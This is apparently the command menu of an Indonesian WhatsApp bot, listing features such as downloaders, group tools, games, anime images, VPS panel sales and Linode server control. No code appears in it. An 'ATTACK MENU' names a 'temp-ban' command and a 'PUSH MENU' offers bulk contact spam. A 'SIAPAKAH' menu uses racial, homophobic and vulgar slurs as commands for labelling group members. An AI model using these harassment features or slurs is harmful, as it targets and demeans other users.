     ヤ ◦ ᴄᴇᴄᴀɴᴠɪᴇᴛɴᴀᴍ
     ヤ ◦ ᴄᴇᴄᴀɴᴋᴏʀᴇᴀ
     ヤ ◦ ᴄᴇᴄᴀɴᴊᴇᴘᴀɴ
     ヤ ◦ ᴄᴇᴄᴀɴ

┈─────────────────┈⫺
*メ O T H E R M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴏᴡɴᴇʀ
     ヤ ◦ ʟɪꜱᴛᴘʀᴇᴍ
     ヤ ◦ ʀᴜɴᴛɪᴍᴇ
     ヤ ◦ ᴛᴏᴛᴀʟꜰɪᴛᴜʀᴇ
     ヤ ◦ ʟɪꜱᴛɢᴄ
     ヤ ◦ ᴄᴇᴋꜱɴ
     ヤ ◦ ʜᴅʀ
     ヤ ◦ limit
     ヤ ◦ ᴘᴇᴍʙᴀʏᴀʀᴀɴ
     ヤ ◦ ꜱᴇᴡᴀ
     ヤ ◦ ʀᴇɢɪꜱᴛᴇʀ
     ヤ ◦ ᴘɪɴ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ɢᴄʙᴏᴛ
     ヤ ◦ ᴘʀᴏꜰɪʟᴇ
     ヤ ◦ ꜱᴛɪᴄᴋᴇʀ
     ヤ ◦ ᴄᴇᴋɢᴄ
     ヤ ◦ ɪᴅʙᴀʜᴀꜱᴀ
     ヤ ◦ ᴀꜰᴋ

┈─────────────────┈⫺
*メ A T T A C K M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴛᴇᴍᴘ-ʙᴀɴ

┈─────────────────┈⫺
*メ D O W N L O A D M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴘʟᴀʏ
     ヤ ◦ ʏᴛᴍᴘ4
     ヤ ◦ ʏᴛᴍᴘ3
     ヤ ◦ ɪɴꜱᴛᴀɢʀᴀᴍ
     ヤ ◦ ᴛɪᴋᴛᴏᴋ
     ヤ ◦ ꜱᴘᴏᴛɪꜰʏ
     ヤ ◦ tiktokaudio
     ヤ ◦ ᴍᴇᴅɪᴀꜰɪʀᴇ
     ヤ ◦ yts
     ヤ ◦ ɢᴏᴏɢʟᴇ
     ヤ ◦ ᴛᴡɪᴛᴛᴇʀ
     ヤ ◦ ɢᴅʀɪᴠᴇ
     ヤ ◦ ɢɪᴛᴄʟᴏɴᴇ
     ヤ ◦ ᴘɪɴ
     ヤ ◦ ᴄᴀᴘᴄᴜᴛ

┈─────────────────┈⫺
*メ A I M E N U*
┈─────────────────┈⫺
     ヤ ◦ ᴀɪ
     ヤ ◦ ᴏᴘᴇɴᴀɪ
     ヤ ◦ ꜱɪᴍɪ
     ヤ ◦ ᴀᴜᴛᴏᴀɪ
     ヤ ◦ ꜱɪᴍɪꜱɪᴍɪ
     ヤ ◦ ᴛᴏᴢᴏᴍʙɪᴇ

┈─────────────────┈⫺
*メ C O N V E R T M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴛᴏᴜʀʟ
     ヤ ◦ ꜱᴛɪᴄᴋᴇʀ
     ヤ ◦ ꜱᴍᴇᴍᴇ
     ヤ ◦ ʜᴅʀ
     ヤ ◦ ɢᴇᴛᴘɪᴄ
     ヤ ◦ ɢᴇᴛɴᴀᴍᴇ
     ヤ ◦ Qᴄ
     ヤ ◦ ᴛᴏᴀᴜᴅɪᴏ
     ヤ ◦ ᴏʙꜰᴜꜱ
     ヤ ◦ ꜱꜱᴡᴇʙ
     ヤ ◦ ᴛᴏɪᴍɢ
     ヤ ◦ ᴛᴏᴢᴏᴍʙɪᴇ
     ヤ ◦ ʀᴇᴍᴏᴠᴇʙɢ

┈─────────────────┈⫺
*メ G R O U P M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴛᴀɢᴀʟʟ
     ヤ ◦ ʜɪᴅᴇᴛᴀɢ
     ヤ ◦ ᴅᴇᴍᴏᴛᴇ
     ヤ ◦ ᴘʀᴏᴍᴏᴛᴇ
     ヤ ◦ ᴀᴅᴅ
     ヤ ◦ ᴋɪᴄᴋ
     ヤ ◦ ɪɴᴠɪᴛᴇ
     ヤ ◦ ꜱᴇɴᴅʟɪɴᴋɢᴄ
     ヤ ◦ ʀᴇꜱᴇᴛʟɪɴᴋɢᴄ
     ヤ ◦ ʟɪɴᴋɢʀᴏᴜᴘ
     ヤ ◦ ᴛᴏᴛᴀɢ
     ヤ ◦ ᴀɴᴛɪʟɪɴᴋ
     ヤ ◦ ᴀɴᴛɪʙᴏᴛ
     ヤ ◦ ꜱᴇᴛᴘᴘɢʀᴏᴜᴘ
     ヤ ◦ ᴅᴇʟ
     ヤ ◦ ꜱᴇᴛɴᴀᴍᴇɢᴄ
     ヤ ◦ ᴅᴇʟᴘᴘɢᴄ
     ヤ ◦ ᴠᴏᴛᴇ
     ヤ ◦ ᴅᴇʟᴇᴛᴇᴠᴏᴛᴇ
     ヤ ◦ ᴜᴘᴠᴏᴛᴇ
     ヤ ◦ ᴅᴏᴡɴᴠᴏᴛᴇ
     ヤ ◦ ᴄʜᴇᴄᴋᴠᴏᴛᴇ
     ヤ ◦ ᴜᴘᴠᴏᴛᴇ
     ヤ ◦ ᴠᴏᴛᴇ
     ヤ ◦ ᴀɴᴛɪᴛᴏxɪᴄ
     ヤ ◦ ᴏᴘᴇɴᴛɪᴍᴇ
     ヤ ◦ ᴄʟᴏꜱᴇᴛɪᴍᴇ
     ヤ ◦ ᴡᴇʟᴄᴏᴍᴇ

┈─────────────────┈⫺
*メ P U S H M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴘᴜꜱʜᴀᴋᴏɴᴛᴀᴋ2
     ヤ ◦ ᴘᴜꜱʜᴋᴏɴᴛᴀᴋ
     ヤ ◦ ᴄᴇᴋɪᴅɢᴄ
     ヤ ◦ ɢᴇᴛɪᴅɢᴄ

┈─────────────────┈⫺
*メ A N O N Y M O U S MENU メ*
┈─────────────────┈⫺
     ヤ ◦ menfess
     ヤ ◦ stopconfess
     ヤ ◦ tolakmenfess
     ヤ ◦ balasmenfess
     ヤ ◦ lanjut
     ヤ ◦ start
     ヤ ◦ sendprofile
     ヤ ◦ anonymouschat
     ヤ ◦ nulis
     
┈─────────────────┈⫺
*メ P R I M B O N M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴀʀᴛɪɴᴀᴍᴀ 
     ヤ ◦ ᴀʀᴛɪᴍɪᴍᴘɪ 
     ヤ ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴᴘᴀꜱᴀɴɢᴀɴ 
     ヤ ◦ ᴋᴇᴄᴏᴄᴏᴋᴀɴɴᴀᴍᴀ 
     ヤ ◦ ᴊᴀᴅɪᴀɴᴘᴇʀɴɪᴋᴀʜᴀɴ 
     ヤ ◦ ʀᴇᴊᴇᴋɪ 
     ヤ ◦ ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ 
     ヤ ◦ ᴘᴇᴋᴇʀᴊᴀᴀɴ 
     ヤ ◦ ᴀʀᴛɪᴛᴀʀᴏᴛ 
     ヤ ◦ ᴘᴏᴛᴇɴꜱɪᴘᴇɴʏᴀᴋɪᴛ 
     ヤ ◦ ʀᴀᴍᴀʟᴀɴɴᴀꜱɪʙ 
     ヤ ◦ ʜᴀʀɪꜱᴀɴɢᴀʀ 
     ヤ ◦ ʜᴀʀɪʙᴀɪᴋ 
     ヤ ◦ ꜰᴇɴɢꜱʜᴜɪ 
     ヤ ◦ ɴᴀɢᴀʜᴀʀɪ
     ヤ ◦ ʜᴀʀɪɴᴀᴀꜱ 
     ヤ ◦ ᴡᴇᴛᴏɴ 
     ヤ ◦ ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ 
     ヤ ◦ jodoh
     ヤ ◦ carikawangc
     ヤ ◦ ᴀʀᴀʜʀᴇᴊᴇᴋɪ 
     ヤ ◦ cekmemek
     ヤ ◦ namaninja
     ヤ ◦ cekkhodam
     ヤ ◦ ꜱɪꜰᴀᴛ 
     ヤ ◦ ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ 
     ヤ ◦ ᴍᴇᴍᴀɴᴄɪɴɢ 
     ヤ ◦ ᴍᴀꜱᴀꜱᴜʙᴜʀ 
     ヤ ◦ ᴢᴏᴅɪᴀᴋ 
     ヤ ◦ ꜱʜɪᴏ 

┈─────────────────┈⫺
*メ A N I M E M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ Kill
     ヤ ◦ Patt
     ヤ ◦ Lick
     ヤ ◦ Yeet
     ヤ ◦ Bonk
     ヤ ◦ Wink
     ヤ ◦ Ponk 
     ヤ ◦ Nom
     ヤ ◦ Slap
     ヤ ◦ Smile
     ヤ ◦ Wave
     ヤ ◦ Smug
     ヤ ◦ Dance
     ヤ ◦ Glomp
     ヤ ◦ Highfive
     ヤ ◦ Handhold
     ヤ ◦ akira
     ヤ ◦ akiyama
     ヤ ◦ ana
     ヤ ◦ asuna
     ヤ ◦ ayuzawa
     ヤ ◦ boruto
     ヤ ◦ chiho
     ヤ ◦ chitoge
     ヤ ◦ cosplaylo
     ヤ ◦ cosplaysagiri 
     ヤ ◦ deidara
     ヤ ◦ doraemon 
     ヤ ◦ elena
     ヤ ◦ emilia
     ヤ ◦ erza
     ヤ ◦ gremory
     ヤ ◦ hestia
     ヤ ◦ hinata
     ヤ ◦ husbu
     ヤ ◦ inori
     ヤ ◦ isuzu
     ヤ ◦ itachi
     ヤ ◦ itori
     ヤ ◦ kaga
     ヤ ◦ kagura
     ヤ ◦ kakasih
     ヤ ◦ kaori
     ヤ ◦ keneki
     ヤ ◦ kotori
     ヤ ◦ kurumi
     ヤ ◦ lol
     ヤ ◦ madara 
     ヤ ◦ megumin
     ヤ ◦ mikey
     ヤ ◦ miku
     ヤ ◦ minato
     ヤ ◦ naruto
     ヤ ◦ neko
     ヤ ◦ neko2
     ヤ ◦ nekonime
     ヤ ◦ nezuko
     ヤ ◦ onepiece
     ヤ ◦ pokemon
     ヤ ◦ randomnime
     ヤ ◦ randomnime2
     ヤ ◦ rize 
     ヤ ◦ sagiri
     ヤ ◦ sakura
     ヤ ◦ sasuke
     ヤ ◦ shina
     ヤ ◦ shinka
     ヤ ◦ shinomiya
     ヤ ◦ shizuka
     ヤ ◦ shota
     ヤ ◦ tejina
     ヤ ◦ toukachan
     ヤ ◦ tsunade
     ヤ ◦ waifu
     ヤ ◦ animewall
     ヤ ◦ yotsuba
     ヤ ◦ yuki
     ヤ ◦ yulibocil
     ヤ ◦ yumeko
     ヤ ◦ 8ball
     ヤ ◦ tickle
     ヤ ◦ feed
     ヤ ◦ Waifu
     ヤ ◦ Neko
  
┈─────────────────┈⫺
*メ P A N E L M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ʀᴀᴍʟɪꜱᴛ
     ヤ ◦ ʙᴀᴄᴋᴜᴘ
     ヤ ◦ ᴛᴜᴛᴏʀɪᴀʟ
     ヤ ◦ ꜱᴛᴀʀᴛꜱʀᴠ 
     ヤ ◦ ᴜɴꜱᴜꜱᴘᴇɴꜱ
     ヤ ◦ ᴡᴇʙᴘᴀɴᴇʟ
     ヤ ◦ ꜱᴜꜱᴘᴇɴᴅ
     ヤ ◦ ꜱᴇɴᴅᴘᴀɴᴇʟ
     ヤ ◦ ᴀᴅᴅꜱʀᴠ
     ヤ ◦ ʟɪꜱᴛᴀᴅᴍɪɴ
     ヤ ◦ ᴀᴅᴍɪɴ
     ヤ ◦ ᴀᴅᴅᴜꜱᴇʀ
     ヤ ◦ ᴅᴇʟᴜꜱʀ
     ヤ ◦ ʟɪꜱᴛᴜꜱʀ
     ヤ ◦ ʟɪꜱᴛꜱʀᴠ
     ヤ ◦ ᴜᴘᴅᴀᴛᴇꜱʀᴠ
     ヤ ◦ ᴅᴇᴛᴜꜱʀ
     ヤ ◦ ʀᴇɪɴꜱᴛᴀʟʟ
     ヤ ◦ ᴘᴀɴᴇʟ

┈─────────────────┈⫺
*メ S U B D O M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ D1
     ヤ ◦ D2
     ヤ ◦ D3
     ヤ ◦ D4

┈─────────────────┈⫺ 
*メ L I N O D E M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ʀᴇꜱᴇᴛᴘᴀꜱꜱᴡᴏʀᴅ
     ヤ ◦ ᴅᴇʟᴇᴛᴇʟɪɴᴏᴅᴇ
     ヤ ◦ ʟɪꜱᴛʟɪɴᴏᴅᴇ
     ヤ ◦ ᴏɴʟɪɴᴏᴅᴇ
     ヤ ◦ ᴏꜰꜰʟɪɴᴏᴅᴇ
     ヤ ◦ ʀᴇʙᴏᴏᴛʟɪɴᴏᴅᴇ
     ヤ ◦ ʀᴇʙᴜɪʟᴅʟɪɴᴏᴅᴇ
     ヤ ◦ ꜱɪꜱᴀʟɪɴᴏᴅᴇ
     ヤ ◦ ꜱᴀʟᴅᴏʟɪɴᴏᴅᴇ
     ヤ ◦ ᴄᴇᴋᴠᴘꜱʟɪɴᴏᴅᴇ
     ヤ ◦ ʟɪɴᴏᴅᴇ2ɢʙ
     ヤ ◦ ʟɪɴᴏᴅᴇ4ɢʙ
     ヤ ◦ ʟɪɴᴏᴅᴇ8ɢʙ
     ヤ ◦ ʟɪɴᴏᴅᴇ16ɢʙ

┈─────────────────┈⫺
*メ S T O R E M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴘᴇᴍʙᴀʏᴀʀᴀɴ
     ヤ ◦ ʟɪꜱᴛᴘʀᴏᴅᴜᴋ
     ヤ ◦ ᴠᴘꜱ
     ヤ ◦ ᴘᴀɴᴇʟ
     ヤ ◦ ʙᴀᴛᴀʟ
     ヤ ◦ ᴘʀᴏꜱᴇꜱ
     ヤ ◦ ᴅᴏɴᴇ
     ヤ ◦ ꜰᴏʀᴍᴀᴛɴᴇᴇᴅ
     ヤ ◦ ꜰᴏʀᴍᴀᴛᴊᴘ
     ヤ ◦ ꜰᴇᴇʀᴇᴋʙᴇʀ
     ヤ ◦ ꜰᴇᴇɢᴄ
     ヤ ◦ ᴅᴏɴᴀꜱɪ
     ヤ ◦ ᴛᴇꜱᴛɪ1
     ヤ ◦ ᴛᴇꜱᴛɪ2
     ヤ ◦ ᴛᴇꜱᴛɪ3 
     ヤ ◦ ᴛᴇꜱᴛɪ4
     ヤ ◦ ᴛᴇꜱᴛɪ5
     ヤ ◦ ᴛᴇꜱᴛɪ6

┈─────────────────┈⫺
*メ G A M E M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴛᴛᴄ
     ヤ ◦ ᴅᴇʟᴛᴄ
     ヤ ◦ ꜱᴜɪᴛᴘᴠᴘ
     ヤ ◦ ᴛᴇʙᴀᴋ ᴋᴀᴛᴀ
     ヤ ◦ ᴛᴇʙᴀᴋ ɢᴀᴍʙᴀʀ
     ヤ ◦ ᴛᴇʙᴀᴋ ʟɪʀɪᴋ
     ヤ ◦ ᴛᴇʙᴀᴋ ᴋᴀʟɪᴍᴀᴛ
     ヤ ◦ ᴛᴇʙᴀᴋ ʟᴀɢᴜ
     ヤ ◦ ᴛᴇʙᴀᴋ ʟᴏɴᴛᴏɴɢ
     ヤ ◦ ꜰᴀᴍɪʟʏ100
     ヤ ◦ ᴋᴜɪꜱᴍᴀᴛʜ ɴᴏᴏʙ
     ヤ ◦ ᴋᴜɪꜱᴍᴀᴛʜ ᴇᴀꜱʏ
     ヤ ◦ ᴋᴜɪꜱᴍᴀᴛʜ ᴍᴇᴅɪᴜᴍ
     ヤ ◦ ᴋᴜɪꜱᴍᴀᴛʜ ʜᴀʀᴅ
     ヤ ◦ ᴋᴜɪꜱᴍᴀᴛʜ ᴇxᴛʀᴇᴍᴇ
     ヤ ◦ ᴋᴜɪꜱᴍᴀᴛʜ ɪᴍᴘᴏꜱꜱɪʙʟᴇ
     ヤ ◦ ᴋᴜɪꜱᴍᴀᴛʜ ɪᴍᴘᴏꜱꜱɪʙʟᴇ2
     ヤ ◦ tebak Bendera2
     ヤ ◦ tebak Kabupaten
     ヤ ◦ tebak Kimia
     ヤ ◦ tebak Asahotak
     ヤ ◦ tebak Siapakahaku
     ヤ ◦ tebak Susunkata
     ヤ ◦ tebak Tekateki

┈─────────────────┈⫺
*メ R A N D O M T T M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ᴛɪᴋᴛᴏᴋɢɪʀʟ
     ヤ ◦ ᴛɪᴋᴛᴏᴋɴᴜᴋᴛʜʏ
     ヤ ◦ ᴛɪᴋᴛᴏᴋᴋᴀʏᴇꜱ
     ヤ ◦ ᴛɪᴋᴛᴏᴋᴘᴀɴʀɪᴋᴀ
     ヤ ◦ ᴛɪᴋᴛᴏᴋɴᴏᴛɴᴏᴛ
     ヤ ◦ ᴛɪᴋᴛᴏᴋɢʜᴇᴀ
     ヤ ◦ ᴛɪᴋᴛᴏᴋꜱᴀɴᴛᴜʏ
     ヤ ◦ ᴛɪᴋᴛᴏᴋʙᴏᴄɪʟ

┈─────────────────┈⫺
   *メ S E A R C H M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ɢᴏᴏɢʟᴇ
     ヤ ◦ ʟɪʀɪᴋ
     ヤ ◦ ᴛᴛꜱᴇᴀᴄʀʜ
     ヤ ◦ ʀᴇᴀᴅᴍᴏʀᴇ
     ヤ ◦ ᴀᴘᴋꜱᴇᴀʀᴄʜ
     ヤ ◦ ꜱᴛɪᴄᴋᴇʀꜱᴇᴀʀᴄʜ
     ヤ ◦ ᴊᴀʀᴀᴋ
     ヤ ◦ ssweb
     ヤ ◦ sswebdesktop
     ヤ ◦ sswebtablet
     ヤ ◦ sswebphone
     ヤ ◦ ꜱᴄ
     ヤ ◦ ᴏᴡɴᴇʀ
     ヤ ◦ ʀᴜʟᴇꜱ
     ヤ ◦ ᴀɪ
     ヤ ◦ tiktokstalk
     ヤ ◦ gamepop
     ヤ ◦ kuliner
     ヤ ◦ otakudesdetails
     ヤ ◦ otakudessearch
     ヤ ◦ siapakah
     ヤ ◦ kcimg
     ヤ ◦ modapk
     ヤ ◦ quotes
     ヤ ◦ islamnews
     ヤ ◦ quotesanime
     ヤ ◦ quotesbacot
     ヤ ◦ cuaca
     ヤ ◦ fliptext

┈─────────────────┈⫺
*メ I S L AM M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ kisahnabi
     ヤ ◦ quotesislami
     ヤ ◦ niatsholat
     ヤ ◦ bacaansholat
     ヤ ◦ doaharian
     ヤ ◦ ayatkursi

┈─────────────────┈⫺
*メ A D D M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ ꜱᴇᴛᴄᴍᴅ
     ヤ ◦ ᴅᴇʟᴄᴍᴅ
     ヤ ◦ ʟɪꜱᴛᴄᴍᴅ
     ヤ ◦ ᴀᴅᴅᴘᴅꜰ
     ヤ ◦ ᴅᴇʟᴘᴅꜰ
     ヤ ◦ ʟɪꜱᴛᴘᴅꜰ
     ヤ ◦ ʏᴏᴘᴅꜰ
     ヤ ◦ ꜱᴇɴᴅᴘᴅꜰ
     ヤ ◦ ᴀᴅᴅᴢɪᴘ
     ヤ ◦ ᴅᴇʟᴢɪᴘ
     ヤ ◦ ʟɪꜱᴛᴢɪᴘ
     ヤ ◦ ʏᴏᴢɪᴘ
     ヤ ◦ ꜱᴇɴᴅᴢɪᴘ
     ヤ ◦ ᴀᴅᴅᴀᴘᴋ
     ヤ ◦ ᴅᴇʟᴀᴘᴋ
     ヤ ◦ ʟɪꜱᴛᴀᴘᴋ
     ヤ ◦ ʏᴏᴀᴘᴋ
     ヤ ◦ ꜱᴇɴᴅᴀᴘᴋ
     ヤ ◦ ᴀᴅᴅᴠɴ
     ヤ ◦ ᴅᴇʟᴠɴ
     ヤ ◦ ʟɪꜱᴛᴠɴ
     ヤ ◦ ᴀᴅᴅᴍꜱɢ
     ヤ ◦ ꜱᴇɴᴅʟɪꜱᴛ
     ヤ ◦ ʟɪꜱᴛᴍꜱɢ
     ヤ ◦ ᴅᴇʟᴍꜱɢ
     ヤ ◦ ɢᴇᴛᴍꜱɢ

┈─────────────────┈⫺
*メ S I A P A K A H M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ tolol
     ヤ ◦ gaguna
     ヤ ◦ jomok
     ヤ ◦ idiot
     ヤ ◦ gay
     ヤ ◦ lesbi
     ヤ ◦ anjink
     ヤ ◦ babi
     ヤ ◦ kucing
     ヤ ◦ beban
     ヤ ◦ bebankeluarga
     ヤ ◦ gadakeluarga
     ヤ ◦ miskin
     ヤ ◦ sampah
     ヤ ◦ wibu
     ヤ ◦ cantik
     ヤ ◦ ganteng
     ヤ ◦ tampan
     ヤ ◦ cute
     ヤ ◦ kind
     ヤ ◦ Islam
     ヤ ◦ kristen
     ヤ ◦ hindu
     ヤ ◦ katolik
     ヤ ◦ gandu
     ヤ ◦ madarchod
     ヤ ◦ kala
     ヤ ◦ gora
     ヤ ◦ chutiya
     ヤ ◦ nibba
     ヤ ◦ nibbi
     ヤ ◦ bhosdiwala
     ヤ ◦ chutmarika
     ヤ ◦ bokachoda
     ヤ ◦ suarerbaccha
     ヤ ◦ bolochoda
     ヤ ◦ muthal
     ヤ ◦ muthbaaz
     ヤ ◦ randibaaz
     ヤ ◦ topibaaz
     ヤ ◦ cunt
     ヤ ◦ nerd
     ヤ ◦ behenchod
     ヤ ◦ behnchoda
     ヤ ◦ bhosdika
     ヤ ◦ nerd
     ヤ ◦ mc
     ヤ ◦ bsdk
     ヤ ◦ bhosdk
     ヤ ◦ nigger
     ヤ ◦ loda
     ヤ ◦ laund
     ヤ ◦ nigga
     ヤ ◦ noobra
     ヤ ◦ tharki
     ヤ ◦ nibba
     ヤ ◦ nibbi
     ヤ ◦ mumu
     ヤ ◦ rascal
     ヤ ◦ scumbag
     ヤ ◦ nuts
     ヤ ◦ comrade
     ヤ ◦ fagot
     ヤ ◦ scoundrel
     ヤ ◦ ditch
     ヤ ◦ dope
     ヤ ◦ gucci
     ヤ ◦ lit
     ヤ ◦ dumbass
     ヤ ◦ sexy
     ヤ ◦ crackhead
     ヤ ◦ mf
     ヤ ◦ motherfucker
     ヤ ◦ dogla
     ヤ ◦ bewda
     ヤ ◦ boka
     ヤ ◦ khanki
     ヤ ◦ bal 
     ヤ ◦ sucker
     ヤ ◦ fuckboy
     ヤ ◦ playboy
     ヤ ◦ fuckgirl
     ヤ ◦ playgirl
     ヤ ◦ hot

┈─────────────────┈⫺
*メ R A N D O M F T M E N U メ*
┈─────────────────┈⫺
     ヤ ◦ aesthetic
     ヤ ◦ coffee
     ヤ ◦ wikimedia
     ヤ ◦ wallpaper
     ヤ ◦ art
     ヤ ◦ bts
     ヤ ◦ dogwoof
     ヤ ◦ catmeow
     ヤ ◦ lizardpic
     ヤ ◦ goosebird
     ヤ ◦ 8ballpool
     ヤ ◦ cosplay
     ヤ ◦ hacker
     ヤ ◦ cyber
     ヤ ◦ gamewallpaperm
     ヤ ◦ islamic
     ヤ ◦ jennie
     ヤ ◦ jiso
     ヤ ◦ satanic
     ヤ ◦ justina
     ヤ ◦ cartoon
     ヤ ◦ pentol
     ヤ ◦ cat
     ヤ ◦ kpop
     ヤ ◦ exo
     ヤ ◦ lisa
     ヤ ◦ space
     ヤ ◦ car
     ヤ ◦ technology
     ヤ ◦ bike
     ヤ ◦ shortquote
     ヤ ◦ antiwork
     ヤ ◦ hacking
     ヤ ◦ boneka
     ヤ ◦ rose
     ヤ ◦ ryujin
     ヤ ◦ ulzzangboy
     ヤ ◦ ulzzanggirl
     ヤ ◦ wall
     ヤ ◦ wallphone
     ヤ ◦ mountain
     ヤ ◦ goose
     ヤ ◦ profilepic
     ヤ ◦ couplepp
     ヤ ◦ programming
     ヤ ◦ pubg
     ヤ ◦ blackpink
     ヤ ◦ randomboy
     ヤ ◦ randomgirl
     ヤ ◦ hijab
     ヤ ◦ chinese
     ヤ ◦ indo
     ヤ ◦ japanese
     ヤ ◦ korean
     ヤ ◦ malay
     ヤ ◦ thai
     ヤ ◦ vietnamese

┈─────────────────┈⫺
*メ T E X T M A K E R M E N U メ*
┈─────────────────┈⫺
     ヤ ◦  blackpink
     ヤ ◦  rainbow2
     ヤ ◦  water_pipe
     ヤ ◦  halloween
     ヤ ◦  sketch
     ヤ ◦  sircuit
     ヤ ◦  discovery
     ヤ ◦  metallic2
     ヤ ◦  fiction
     ヤ ◦  demon
     ヤ ◦  transformer
     ヤ ◦  berry
     ヤ ◦  thunder
     ヤ ◦  magma
     ヤ ◦  3dstone
     ヤ ◦  neon
     ヤ ◦  glitch
     ヤ ◦  harry_potter
     ヤ ◦  embossed
     ヤ ◦  broken
     ヤ ◦  papercut
     ヤ ◦  gradient
     ヤ ◦  glossy
     ヤ ◦  watercolor
     ヤ ◦  multicolor
     ヤ ◦  neon_devil
     ヤ ◦  underwater
     ヤ ◦  bear
     ヤ ◦  wonderfulg
     ヤ ◦  christmas
     ヤ ◦  neon_light
     ヤ ◦  snow
     ヤ ◦  cloudsky
     ヤ ◦  luxury2
     ヤ ◦  gradient2
     ヤ ◦  summer
     ヤ ◦  writing
     ヤ ◦  engraved
     ヤ ◦  summery
     ヤ ◦  3dglue
     ヤ ◦  metaldark
     ヤ ◦  neonlight
     ヤ ◦  oscar
     ヤ ◦  minion
     ヤ ◦  holographic
     ヤ ◦  purple
     ヤ ◦  glossyb
     ヤ ◦  deluxe2
     ヤ ◦  glossyc
     ヤ ◦  fabric
     ヤ ◦  neonc
     ヤ ◦  newyear
     ヤ ◦  newyear2
     ヤ ◦  metals
     ヤ ◦  xmas
     ヤ ◦  blood
     ヤ ◦  darkg
     ヤ ◦  joker
     ヤ ◦  wicker
     ヤ ◦  natural
     ヤ ◦  firework
     ヤ ◦  skeleton
     ヤ ◦  balloon
     ヤ ◦  balloon2
     ヤ ◦  balloon3
     ヤ ◦  balloon4
     ヤ ◦  balloon5
     ヤ ◦  balloon6
     ヤ ◦  balloon7
     ヤ ◦  steel
     ヤ ◦  gloss
     ヤ ◦  denim
     ヤ ◦  decorate
     ヤ ◦  decorate2
     ヤ ◦  peridot
     ヤ ◦  rock
     ヤ ◦  glass
     ヤ ◦  glass2
     ヤ ◦  glass3
     ヤ ◦  glass4
     ヤ ◦  captain_as2
     ヤ ◦  robot
     ヤ ◦  equalizer
     ヤ ◦  toxic
     ヤ ◦  sparkling
     ヤ ◦  sparkling2
     ヤ ◦  sparkling3
     ヤ ◦  decorative
     ヤ ◦  chocolate
     ヤ ◦  strawberry
     ヤ ◦  koifish
     ヤ ◦  bread
     ヤ ◦  matrix
     ヤ ◦  blood2
     ヤ ◦  neonligth2
     ヤ ◦  thunder2
     ヤ ◦  3dbox
     ヤ ◦  neon2
     ヤ ◦  roadw
     ヤ ◦  bokeh
     ヤ ◦  gneon
     ヤ ◦  advanced
     ヤ ◦  dropwater
     ヤ ◦  wall
     ヤ ◦  chrismast
     ヤ ◦  honey
     ヤ ◦  drug
     ヤ ◦  marble
     ヤ ◦  marble2
     ヤ ◦  ice
     ヤ ◦  juice
     ヤ ◦  rusty
     ヤ ◦  abstra
     ヤ ◦  biscuit
     ヤ ◦  wood
     ヤ ◦  scifi
     ヤ ◦  metalr
     ヤ ◦  purpleg
     ヤ ◦  shiny
     ヤ ◦  jewelry
     ヤ ◦  jewelry2
     ヤ ◦  metalh
     ヤ ◦  golden
     ヤ ◦  glitter
     ヤ ◦  metale
     ヤ ◦  carbon
     ヤ ◦  candy
     ヤ ◦  metalb
     ヤ ◦  gemb
     ヤ ◦  3dchrome
     ヤ ◦  metalb2
     ヤ ◦  metalg

┈─────────────────┈⫺
*メ S O U N D M E N U*
┈─────────────────┈⫺
     ヤ ◦  sound1
     ヤ ◦  sound2
     ヤ ◦  sound3
     ヤ ◦  sound4
     ヤ ◦  sound5
     ヤ ◦  sound6
     ヤ ◦  sound7
     ヤ ◦  sound8
     ヤ ◦  sound9
     ヤ ◦  sound10
     ヤ ◦  sound11
     ヤ ◦  sound12
     ヤ ◦  sound13
     ヤ ◦  sound14
     ヤ ◦  sound15
     ヤ ◦  sound16
     ヤ ◦  sound17
     ヤ ◦  sound18
     ヤ ◦  sound18
     ヤ ◦  sound20
     ヤ ◦  sound21
     ヤ ◦  sound22
     ヤ ◦  sound23
     ヤ ◦  sound24
     ヤ ◦  sound25
     ヤ ◦  sound26
     ヤ ◦  sound27
     ヤ ◦  sound28
     ヤ ◦  sound29
     ヤ ◦  sound30
     ヤ ◦  sound31
     ヤ ◦  sound32
     ヤ ◦  sound33
     ヤ ◦  sound34
     ヤ ◦  sound35
     ヤ ◦  sound36
     ヤ ◦  sound37
     ヤ ◦  sound38
     ヤ ◦  sound39
     ヤ ◦  sound40
     ヤ ◦  sound41
     ヤ ◦  sound42
     ヤ ◦  sound43
     ヤ ◦  sound44
     ヤ ◦  sound45
     ヤ ◦  sound46
     ヤ ◦  sound47
     ヤ ◦  sound48
     ヤ ◦  sound49
     ヤ ◦  sound50
     ヤ ◦  sound51
     ヤ ◦  sound52
     ヤ ◦  sound53   
     ヤ ◦  sound54
     ヤ ◦  sound55
     ヤ ◦  sound56
     ヤ ◦  sound57
     ヤ ◦  sound58
     ヤ ◦  sound59
     ヤ ◦  sound60
     ヤ ◦  sound61
     ヤ ◦  sound62
     ヤ ◦  sound63
     ヤ ◦  sound64
     ヤ ◦  sound65
     ヤ ◦  sound66
     ヤ ◦  sound67
     ヤ ◦  sound68
     ヤ ◦  sound69
     ヤ ◦  sound70
     ヤ ◦  sound71
     ヤ ◦  sound72
     ヤ ◦  sound73
     ヤ ◦  sound74
     ヤ ◦  sound75
     ヤ ◦  sound76
     ヤ ◦  sound77
     ヤ ◦  sound78
     ヤ ◦  sound79
     ヤ ◦  sound80
     ヤ ◦  sound81
     ヤ ◦  sound82
     ヤ ◦  sound83
     ヤ ◦  sound84
     ヤ ◦  sound85
